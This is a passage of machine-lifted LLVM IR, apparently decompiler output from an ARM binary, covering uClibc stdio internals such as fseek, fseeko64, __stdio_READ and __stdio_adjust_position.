  %v1_19b10 = and i32 %v1_19b0c, -4
  %v2_19b14 = add i32 %v1_19b10, %v0_19b08
  %tmp = icmp ult i32 %v2_19b08, 12
  br i1 %tmp, label %dec_label_pc_19b54, label %dec_label_pc_19b28

dec_label_pc_19b28:                               ; preds = %entry
  %v1_19b20 = add i32 %v2_19b14, 12
  %v0_19b28 = load i32, i32* @r0, align 4
  %v1_19b28 = add i32 %v0_19b28, 16
  %v1_19b2c = inttoptr i32 %v1_19b28 to i32*
  %v2_19b2c = load i32, i32* %v1_19b2c, align 4
  %v3_19b2c = add i32 %v0_19b28, 20
  %v4_19b2c = inttoptr i32 %v3_19b2c to i32*
  %v5_19b2c = load i32, i32* %v4_19b2c, align 4
  %v2_19b30 = add i32 %v5_19b2c, %v2_19b2c
  %tmp3 = icmp ugt i32 %v1_19b20, %v2_19b30
  br i1 %tmp3, label %dec_label_pc_19b54, label %dec_label_pc_19b3c

dec_label_pc_19b3c:                               ; preds = %dec_label_pc_19b28
  %v3_19b3c = inttoptr i32 %v2_19b14 to i32*
  %v4_19b3c = load i32, i32* %v3_19b3c, align 4
  %v1_19b40 = add i32 %v4_19b3c, 3
  %v1_19b44 = and i32 %v1_19b40, -4
  %v2_19b48 = add i32 %v1_19b44, %v2_19b14
  %tmp4 = icmp ugt i32 %v2_19b48, %v2_19b30
  br i1 %tmp4, label %dec_label_pc_19b54, label %dec_label_pc_19b58

dec_label_pc_19b54:                               ; preds = %dec_label_pc_19b3c, %dec_label_pc_19b28, %entry
  br label %dec_label_pc_19b58

dec_label_pc_19b58:                               ; preds = %dec_label_pc_19b3c, %dec_label_pc_19b54
  %v0_19b58 = phi i32 [ %v2_19b14, %dec_label_pc_19b3c ], [ 0, %dec_label_pc_19b54 ]
  ret i32 %v0_19b58

; uselistorder directives
  uselistorder i32 %v2_19b14, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19b58, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_19b60 = load i32, i32* @r2, align 4
  store i32 %v0_19b60, i32* @r3, align 4
  %v0_19b68 = call i32 @__GI_fseeko64()
  ret i32 %v0_19b68
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_19ba8 = load i32, i32* @r4, align 4
  %v6_19ba8 = load i32, i32* @r5, align 4
  %v9_19ba8 = load i32, i32* @r6, align 4
  %v12_19ba8 = load i32, i32* @r7, align 4
  %v0_19bac = load i32, i32* @r3, align 4
  %v2_19bb0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_19bac, i32* @r6, align 4
  %v0_19bb8 = load i32, i32* @r0, align 4
  store i32 %v0_19bb8, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_19bac, 3
  br i1 %tmp, label %dec_label_pc_19bd4, label %dec_label_pc_19bc0

dec_label_pc_19bc0:                               ; preds = %entry
  %v0_19bc0 = call i32 @__errno_location()
  store i32 %v0_19bc0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_19bcc = inttoptr i32 %v0_19bc0 to i32*
  store i32 22, i32* %v2_19bcc, align 4
  br label %.thread3

dec_label_pc_19bd4:                               ; preds = %entry
  %v1_19bd4 = add i32 %v0_19bb8, 52
  %v2_19bd4 = inttoptr i32 %v1_19bd4 to i32*
  %v3_19bd4 = load i32, i32* %v2_19bd4, align 4
  store i32 %v3_19bd4, i32* @r7, align 4
  %v2_19bd8 = icmp eq i32 %v3_19bd4, 0
  %v0_19bdc = load i32, i32* @r1, align 4
  store i32 %v0_19bdc, i32* %stack_var_-28, align 4
  br i1 %v2_19bd8, label %dec_label_pc_19be8, label %dec_label_pc_19c14

dec_label_pc_19be8:                               ; preds = %dec_label_pc_19bd4
  %v1_19be8 = add i32 %v0_19bb8, 56
  store i32 %v1_19be8, i32* @r4, align 4
  store i32 58060, i32* %r3.global-to-local, align 4
  store i32 %v2_19bb0, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v1_19be8, i32* @r2, align 4
  %v1_19c00 = call i32 @__pthread_cleanup_push_defer()
  %v0_19c04 = load i32, i32* @r4, align 4
  store i32 %v0_19c04, i32* %r0.global-to-local, align 4
  store i32 62768, i32* %r3.global-to-local, align 4
  store i32 105492, i32* @lr, align 4
  %v2_19c10 = call i32 @pthread_mutex_lock(i32 %v0_19c04)
  store i32 %v2_19c10, i32* %r0.global-to-local, align 4
  %v0_19c14.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19c14

dec_label_pc_19c14:                               ; preds = %dec_label_pc_19bd4, %dec_label_pc_19be8
  %v0_19c20 = phi i32 [ %v0_19bb8, %dec_label_pc_19bd4 ], [ %v0_19c14.pre, %dec_label_pc_19be8 ]
  %v1_19c14 = inttoptr i32 %v0_19c20 to i8*
  %v2_19c14 = load i8, i8* %v1_19c14, align 1
  %v3_19c14 = zext i8 %v2_19c14 to i32
  store i32 %v3_19c14, i32* %r3.global-to-local, align 4
  %v1_19c18 = and i32 %v3_19c14, 64
  %v2_19c18 = icmp eq i32 %v1_19c18, 0
  br i1 %v2_19c18, label %dec_label_pc_19c30, label %dec_label_pc_19c20

dec_label_pc_19c20:                               ; preds = %dec_label_pc_19c14
  store i32 %v0_19c20, i32* @r0, align 4
  %v0_19c24 = call i32 @__stdio_wcommit()
  store i32 %v0_19c24, i32* %r0.global-to-local, align 4
  %v2_19c28 = icmp eq i32 %v0_19c24, 0
  br i1 %v2_19c28, label %dec_label_pc_19c30, label %dec_label_pc_19ca0

dec_label_pc_19c30:                               ; preds = %dec_label_pc_19c20, %dec_label_pc_19c14
  %v0_19c30 = load i32, i32* @r6, align 4
  %v7_19c30 = icmp eq i32 %v0_19c30, 1
  br i1 %v7_19c30, label %dec_label_pc_19c38, label %dec_label_pc_19c30.dec_label_pc_19c4c_crit_edge

dec_label_pc_19c30.dec_label_pc_19c4c_crit_edge:  ; preds = %dec_label_pc_19c30
  br label %dec_label_pc_19c4c

dec_label_pc_19c38:                               ; preds = %dec_label_pc_19c30
  %v0_19c38 = load i32, i32* @r5, align 4
  store i32 %v0_19c38, i32* %r0.global-to-local, align 4
  %v2_19c3c = ptrtoint i32* %stack_var_-28 to i32
  %v2_19c40 = inttoptr i32 %v0_19c38 to i8*
  %v3_19c40 = call i32 @__stdio_adjust_position(i8* %v2_19c40, i32 %v2_19c3c)
  store i32 %v3_19c40, i32* %r0.global-to-local, align 4
  %v1_19c44 = icmp slt i32 %v3_19c40, 0
  br i1 %v1_19c44, label %dec_label_pc_19ca0, label %dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge

dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge:  ; preds = %dec_label_pc_19c38
  %v0_19c4c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19c4c

dec_label_pc_19c4c:                               ; preds = %dec_label_pc_19c30.dec_label_pc_19c4c_crit_edge, %dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge
  %v0_19c4c = phi i32 [ %v0_19c30, %dec_label_pc_19c30.dec_label_pc_19c4c_crit_edge ], [ %v0_19c4c.pre, %dec_label_pc_19c38.dec_label_pc_19c4c_crit_edge ]
  store i32 %v0_19c4c, i32* %r2.global-to-local, align 4
  %v0_19c50 = load i32, i32* @r5, align 4
  store i32 %v0_19c50, i32* %r0.global-to-local, align 4
  %v4_19c58 = call i32 @__stdio_seek(i32 %v0_19c50, i32* nonnull %stack_var_-28, i32 %v0_19c4c)
  store i32 %v4_19c58, i32* %r0.global-to-local, align 4
  %v1_19c5c = icmp slt i32 %v4_19c58, 0
  br i1 %v1_19c5c, label %dec_label_pc_19ca0, label %dec_label_pc_19c64

dec_label_pc_19c64:                               ; preds = %dec_label_pc_19c4c
  %v0_19c64 = load i32, i32* @r5, align 4
  %v1_19c64 = inttoptr i32 %v0_19c64 to i32*
  %v2_19c64 = load i32, i32* %v1_19c64, align 4
  store i32 %v2_19c64, i32* %r3.global-to-local, align 4
  %v1_19c68 = add i32 %v0_19c64, 8
  %v2_19c68 = inttoptr i32 %v1_19c68 to i32*
  %v3_19c68 = load i32, i32* %v2_19c68, align 4
  store i32 %v3_19c68, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_19c70 = and i32 %v2_19c64, -72
  store i32 %v1_19c70, i32* %r3.global-to-local, align 4
  %v3_19c74 = sdiv i32 %v2_19c64, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_19c7c = trunc i32 %v3_19c74 to i8
  %v3_19c7c = add i32 %v0_19c64, 1
  %v4_19c7c = inttoptr i32 %v3_19c7c to i8*
  store i8 %v1_19c7c, i8* %v4_19c7c, align 1
  %v0_19c80 = load i32, i32* %r2.global-to-local, align 4
  %v1_19c80 = load i32, i32* @r5, align 4
  %v2_19c80 = add i32 %v1_19c80, 28
  %v3_19c80 = inttoptr i32 %v2_19c80 to i32*
  store i32 %v0_19c80, i32* %v3_19c80, align 4
  %v0_19c84 = load i32, i32* %r0.global-to-local, align 4
  %v1_19c84 = trunc i32 %v0_19c84 to i8
  %v2_19c84 = load i32, i32* @r5, align 4
  %v3_19c84 = add i32 %v2_19c84, 2
  %v4_19c84 = inttoptr i32 %v3_19c84 to i8*
  store i8 %v1_19c84, i8* %v4_19c84, align 1
  %v0_19c88 = load i32, i32* %r3.global-to-local, align 4
  %v1_19c88 = trunc i32 %v0_19c88 to i8
  %v2_19c88 = load i32, i32* @r5, align 4
  %v3_19c88 = inttoptr i32 %v2_19c88 to i8*
  store i8 %v1_19c88, i8* %v3_19c88, align 1
  %v0_19c8c = load i32, i32* %r2.global-to-local, align 4
  %v1_19c8c = load i32, i32* @r5, align 4
  %v2_19c8c = add i32 %v1_19c8c, 16
  %v3_19c8c = inttoptr i32 %v2_19c8c to i32*
  store i32 %v0_19c8c, i32* %v3_19c8c, align 4
  %v0_19c90 = load i32, i32* %r2.global-to-local, align 4
  %v1_19c90 = load i32, i32* @r5, align 4
  %v2_19c90 = add i32 %v1_19c90, 20
  %v3_19c90 = inttoptr i32 %v2_19c90 to i32*
  store i32 %v0_19c90, i32* %v3_19c90, align 4
  %v0_19c94 = load i32, i32* %r2.global-to-local, align 4
  %v1_19c94 = load i32, i32* @r5, align 4
  %v2_19c94 = add i32 %v1_19c94, 24
  %v3_19c94 = inttoptr i32 %v2_19c94 to i32*
  store i32 %v0_19c94, i32* %v3_19c94, align 4
  %v0_19c98 = load i32, i32* %r0.global-to-local, align 4
  %v1_19c98 = load i32, i32* @r5, align 4
  %v2_19c98 = add i32 %v1_19c98, 44
  %v3_19c98 = inttoptr i32 %v2_19c98 to i32*
  store i32 %v0_19c98, i32* %v3_19c98, align 4
  br label %dec_label_pc_19ca4

dec_label_pc_19ca0:                               ; preds = %dec_label_pc_19c20, %dec_label_pc_19c4c, %dec_label_pc_19c38
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19ca4

dec_label_pc_19ca4:                               ; preds = %dec_label_pc_19c64, %dec_label_pc_19ca0
  %v0_19ca4 = load i32, i32* @r7, align 4
  %v2_19ca4 = icmp eq i32 %v0_19ca4, 0
  br i1 %v2_19ca4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19ca4
  store i32 %v2_19bb0, i32* %r0.global-to-local, align 4
  store i32 58236, i32* %r3.global-to-local, align 4
  store i32 105660, i32* @lr, align 4
  call void @__pseudo_branch(i32 58236)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19ca4, %dec_label_pc_19bc0, %bb
  %v0_19cbc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19cbc, i32* %r0.global-to-local, align 4
  store i32 %v3_19ba8, i32* @r4, align 4
  store i32 %v6_19ba8, i32* @r5, align 4
  store i32 %v9_19ba8, i32* @r6, align 4
  store i32 %v12_19ba8, i32* @r7, align 4
  ret i32 %v0_19cbc

; uselistorder directives
  uselistorder i32 %v0_19c4c, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 9, 10, 11, 12, 2, 1, 4, 3, 6, 0, 5, 7 }
  uselistorder i32 22, { 30, 51, 31, 32, 43, 33, 34, 35, 36, 49, 50, 37, 52, 18, 48, 38, 39, 40, 0, 19, 44, 45, 1, 47, 2, 46, 3, 10, 12, 24, 4, 20, 21, 8, 22, 11, 5, 6, 7, 13, 25, 14, 26, 9, 15, 27, 16, 28, 17, 29, 23, 53, 41, 42 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19ca4, { 1, 0 }
  uselistorder label %dec_label_pc_19ca0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19c4c, { 1, 0 }
  uselistorder label %dec_label_pc_19c14, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19cd8 = load i32, i32* @r4, align 4
  store i32 %v3_19cd8, i32* %stack_var_-12, align 4
  %v6_19cd8 = load i32, i32* @r5, align 4
  %v3_19cdc = load i8, i8* %arg1, align 1
  %v4_19cdc = zext i8 %v3_19cdc to i32
  store i32 %v4_19cdc, i32* %r3.global-to-local, align 4
  %v1_19ce0 = and i32 %v4_19cdc, 4
  store i32 %v1_19ce0, i32* @r5, align 4
  %v2_19ce0 = icmp eq i32 %v1_19ce0, 0
  store i1 %v2_19ce0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_19ce0, label %bb8, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_19cd8, i32* @r4, align 4
  store i32 %v6_19cd8, i32* @r5, align 4
  ret i32 0

bb8:                                              ; preds = %entry
  %v1_19cf0 = icmp slt i32 %arg2, 0
  %v2_19cf0 = icmp eq i32 %arg2, 0
  store i1 %v2_19cf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_19cf0, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_19cf8 = add i32 %tmp, 4
  %v2_19cf8 = inttoptr i32 %v1_19cf8 to i32*
  %v3_19cf8 = load i32, i32* %v2_19cf8, align 4
  store i32 %v3_19cf8, i32* @r0, align 4
  %v1_19cfc = call i32 @__libc_read(i32 %v3_19cf8)
  store i32 %v1_19cfc, i32* %r0.global-to-local, align 4
  %v2_19d00 = icmp eq i32 %v1_19cfc, 0
  store i1 %v2_19d00, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_19cfc, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_19d04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_19d04, i32* @r4, align 4
  store i32 %v6_19cd8, i32* @r5, align 4
  ret i32 %v1_19cfc

bb13:                                             ; preds = %bb10
  %v0_19d08 = load i32, i32* @r4, align 4
  %v1_19d08 = inttoptr i32 %v0_19d08 to i32*
  %v2_19d08 = load i32, i32* %v1_19d08, align 4
  %v1_19d0c = or i32 %v2_19d08, 8
  store i32 %v1_19d0c, i32* %r1.global-to-local, align 4
  %v1_19d10 = or i32 %v2_19d08, 4
  store i32 %v1_19d10, i32* %r3.global-to-local, align 4
  %v3_19d14 = sdiv i32 %v2_19d08, 256
  store i32 %v3_19d14, i32* %ip.global-to-local, align 4
  br i1 %v2_19d00, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_19d1c = load i32, i32* @r5, align 4
  store i32 %v1_19d1c, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_19d20 = trunc i32 %v3_19d14 to i8
  %v4_19d20 = add i32 %v0_19d08, 1
  %v5_19d20 = inttoptr i32 %v4_19d20 to i8*
  store i8 %v2_19d20, i8* %v5_19d20, align 1
  %v0_19d24.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19d24.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_19d24 = load i32, i32* %r3.global-to-local, align 4
  %v2_19d24 = trunc i32 %v1_19d24 to i8
  %v3_19d24 = load i32, i32* @r4, align 4
  %v4_19d24 = inttoptr i32 %v3_19d24 to i8*
  store i8 %v2_19d24, i8* %v4_19d24, align 1
  %v0_19d28.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19d28.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_19d28 = load i32, i32* %ip.global-to-local, align 4
  %v2_19d28 = trunc i32 %v1_19d28 to i8
  %v3_19d28 = load i32, i32* @r4, align 4
  %v4_19d28 = add i32 %v3_19d28, 1
  %v5_19d28 = inttoptr i32 %v4_19d28 to i8*
  store i8 %v2_19d28, i8* %v5_19d28, align 1
  %v0_19d2c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19d2c.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_19d2c = load i32, i32* %r1.global-to-local, align 4
  %v2_19d2c = trunc i32 %v1_19d2c to i8
  %v3_19d2c = load i32, i32* @r4, align 4
  %v4_19d2c = inttoptr i32 %v3_19d2c to i8*
  store i8 %v2_19d2c, i8* %v4_19d2c, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_19d30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19d30, i32* @r4, align 4
  store i32 %v6_19cd8, i32* @r5, align 4
  %v11_19d30 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_19d30

; uselistorder directives
  uselistorder i32 %v3_19d14, { 1, 0 }
  uselistorder i32 %v6_19cd8, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 4, 2, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 (i32)* @__libc_read, { 1, 5, 4, 0, 3, 2 }
  uselistorder i32 2147483647, { 3, 4, 0, 2, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_19d34 = load i32, i32* @r4, align 4
  store i32 %v3_19d34, i32* %stack_var_-16, align 4
  %v2_19d38 = add i32 %tmp, 1
  %v3_19d38 = inttoptr i32 %v2_19d38 to i8*
  %v4_19d38 = load i8, i8* %v3_19d38, align 1
  %v5_19d38 = zext i8 %v4_19d38 to i32
  %v3_19d3c = load i8, i8* %arg1, align 1
  %v4_19d3c = zext i8 %v3_19d3c to i32
  store i32 %v4_19d3c, i32* %r2.global-to-local, align 4
  %v4_19d40 = mul nuw nsw i32 %v5_19d38, 256
  %v5_19d40 = or i32 %v4_19d3c, %v4_19d40
  store i32 %v5_19d40, i32* @lr, align 4
  %tmp15 = urem i8 %v3_19d3c, 4
  %v2_19d44 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_19d44, label %bb, label %dec_label_pc_19d54

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_19d54:                               ; preds = %entry
  %v1_19d44 = zext i8 %tmp15 to i32
  %v1_19d54 = add nsw i32 %v1_19d44, -1
  %v7_19d54 = icmp eq i8 %tmp15, 1
  br i1 %v7_19d54, label %.thread, label %dec_label_pc_19d5c

dec_label_pc_19d5c:                               ; preds = %dec_label_pc_19d54
  %v1_19d5c = and i32 %v4_19d40, 2048
  %v2_19d5c = icmp eq i32 %v1_19d5c, 0
  br i1 %v2_19d5c, label %.thread, label %dec_label_pc_19d64

dec_label_pc_19d64:                               ; preds = %dec_label_pc_19d5c
  %v8_19d68 = icmp sgt i32 %v1_19d54, 1
  br i1 %v8_19d68, label %dec_label_pc_19df4, label %dec_label_pc_19d6c

dec_label_pc_19d6c:                               ; preds = %dec_label_pc_19d64
  %v2_19d6c = add i32 %tmp, 40
  %v3_19d6c = inttoptr i32 %v2_19d6c to i32*
  %v4_19d6c = load i32, i32* %v3_19d6c, align 4
  %v2_19d70 = icmp eq i32 %v4_19d6c, 0
  br i1 %v2_19d70, label %dec_label_pc_19d78, label %dec_label_pc_19df4

dec_label_pc_19d78:                               ; preds = %dec_label_pc_19d6c
  %v2_19d78 = add i32 %tmp, 3
  %v3_19d78 = inttoptr i32 %v2_19d78 to i8*
  %v4_19d78 = load i8, i8* %v3_19d78, align 1
  %v5_19d78 = zext i8 %v4_19d78 to i32
  %v2_19d7c = add i32 %tmp, 44
  %v3_19d7c = inttoptr i32 %v2_19d7c to i32*
  %v4_19d7c = load i32, i32* %v3_19d7c, align 4
  store i32 %v4_19d7c, i32* %r2.global-to-local, align 4
  %v2_19d80 = sub nsw i32 %v1_19d54, %v5_19d78
  %v1_19d88 = add nsw i32 %v2_19d80, -1
  %tmp11 = icmp slt i32 %v4_19d7c, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_19d78
  %v7_19d8c = add i32 %tmp, 2
  %v8_19d8c = inttoptr i32 %v7_19d8c to i8*
  %v9_19d8c = load i8, i8* %v8_19d8c, align 1
  %v10_19d8c = zext i8 %v9_19d8c to i32
  %v7_19d90 = sub nsw i32 %v1_19d88, %v10_19d8c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19d78, %bb, %dec_label_pc_19d5c, %dec_label_pc_19d54, %bb12
  %v0_19dac = phi i32 [ %v1_19d54, %dec_label_pc_19d5c ], [ %v1_19d54, %dec_label_pc_19d54 ], [ 0, %bb ], [ %v7_19d90, %bb12 ], [ %v1_19d88, %dec_label_pc_19d78 ]
  %v1_19d94 = and i32 %v4_19d3c, 64
  %v2_19d94 = icmp eq i32 %v1_19d94, 0
  %storemerge.in.in.v = select i1 %v2_19d94, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_19da0 = add i32 %tmp, 16
  %v3_19da0 = inttoptr i32 %v2_19da0 to i32*
  %v4_19da0 = load i32, i32* %v3_19da0, align 4
  %v2_19da4 = sub i32 %storemerge, %v4_19da0
  %v1_19da8 = inttoptr i32 %arg2 to i32*
  %v2_19da8 = load i32, i32* %v1_19da8, align 4
  store i32 %v2_19da8, i32* %r1.global-to-local, align 4
  %v3_19da8 = add i32 %arg2, 4
  %v4_19da8 = inttoptr i32 %v3_19da8 to i32*
  %v5_19da8 = load i32, i32* %v4_19da8, align 4
  store i32 %v5_19da8, i32* %r2.global-to-local, align 4
  %v2_19dac = add i32 %v2_19da4, %v0_19dac
  store i32 %v2_19dac, i32* %r5.global-to-local, align 4
  %v2_19db0 = sub i32 %v2_19da8, %v2_19dac
  %v2_19db4 = and i32 %v2_19dac, 1073741824
  %v3_19db4 = icmp ne i32 %v2_19db4, 0
  %v6_19db4 = icmp eq i1 %v3_19db4, false
  %tmp16 = icmp slt i32 %v2_19dac, 0
  %v4_19db4.neg = zext i1 %tmp16 to i32
  %v7_19db4 = add i32 %v5_19da8, %v4_19db4.neg
  %v9_19db4 = sext i1 %v6_19db4 to i32
  %v10_19db4 = add i32 %v7_19db4, %v9_19db4
  store i32 %v10_19db4, i32* %r4.global-to-local, align 4
  store i32 %v2_19db0, i32* %v1_19da8, align 4
  %v5_19db8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19db8, i32* %v4_19da8, align 4
  %v0_19dbc = load i32, i32* %r6.global-to-local, align 4
  %v1_19dbc = add i32 %v0_19dbc, 4
  %v2_19dbc = inttoptr i32 %v1_19dbc to i32*
  %v3_19dbc = load i32, i32* %v2_19dbc, align 4
  %v1_19dc0 = load i32, i32* %r2.global-to-local, align 4
  %v8_19dc4 = icmp sgt i32 %v3_19dbc, %v1_19dc0
  br i1 %v8_19dc4, label %dec_label_pc_19dd8, label %dec_label_pc_19dc8

dec_label_pc_19dc8:                               ; preds = %.thread
  %v9_19dc0 = icmp eq i32 %v3_19dbc, %v1_19dc0
  br i1 %v9_19dc0, label %dec_label_pc_19dcc, label %dec_label_pc_19ddcthread-pre-split

dec_label_pc_19dcc:                               ; preds = %dec_label_pc_19dc8
  %v1_19dcc = inttoptr i32 %v0_19dbc to i32*
  %v2_19dcc = load i32, i32* %v1_19dcc, align 4
  %v1_19dd0 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_19dcc, %v1_19dd0
  br i1 %tmp17, label %dec_label_pc_19dd8, label %dec_label_pc_19ddcthread-pre-split

dec_label_pc_19dd8:                               ; preds = %dec_label_pc_19dcc, %.thread
  %v0_19dd8 = load i32, i32* %r5.global-to-local, align 4
  %v1_19dd8 = sub i32 0, %v0_19dd8
  store i32 %v1_19dd8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19ddc

dec_label_pc_19ddcthread-pre-split:               ; preds = %dec_label_pc_19dcc, %dec_label_pc_19dc8
  %v0_19ddc.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19ddc

dec_label_pc_19ddc:                               ; preds = %dec_label_pc_19ddcthread-pre-split, %dec_label_pc_19dd8
  %v0_19ddc = phi i32 [ %v0_19ddc.pr, %dec_label_pc_19ddcthread-pre-split ], [ %v1_19dd8, %dec_label_pc_19dd8 ]
  %v1_19ddc = icmp slt i32 %v0_19ddc, 0
  br i1 %v1_19ddc, label %dec_label_pc_19de4, label %dec_label_pc_19df8

dec_label_pc_19de4:                               ; preds = %dec_label_pc_19ddc
  %v0_19de4 = call i32 @__errno_location()
  %v2_19dec = inttoptr i32 %v0_19de4 to i32*
  store i32 75, i32* %v2_19dec, align 4
  %v0_19df8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19df8

dec_label_pc_19df4:                               ; preds = %dec_label_pc_19d6c, %dec_label_pc_19d64
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_19df8

dec_label_pc_19df8:                               ; preds = %dec_label_pc_19ddc, %dec_label_pc_19de4, %dec_label_pc_19df4
  %v0_19df8 = phi i32 [ %v0_19ddc, %dec_label_pc_19ddc ], [ %v0_19df8.pre, %dec_label_pc_19de4 ], [ -1, %dec_label_pc_19df4 ]
  %v2_19dfc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19dfc, i32* @r4, align 4
  ret i32 %v0_19df8

; uselistorder directives
  uselistorder i32 %v1_19dc0, { 1, 0 }
  uselistorder i32 %v3_19dbc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_19d3c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 2048, { 4, 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19df8, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19e00 = load i32, i32* @r4, align 4
  store i32 %v3_19e00, i32* %stack_var_-8, align 4
  %v1_19e04 = add i32 %arg1, 8
  %v1_19e08 = inttoptr i32 %v1_19e04 to i32*
  %v2_19e08 = load i32, i32* %v1_19e08, align 4
  store i32 %v2_19e08, i32* @r1, align 4
  %v3_19e08 = add i32 %arg1, 12
  %v4_19e08 = inttoptr i32 %v3_19e08 to i32*
  %v5_19e08 = load i32, i32* %v4_19e08, align 4
  %v2_19e0c = sub i32 %v5_19e08, %v2_19e08
  store i32 %v2_19e0c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_19e14 = inttoptr i32 %arg1 to i8*
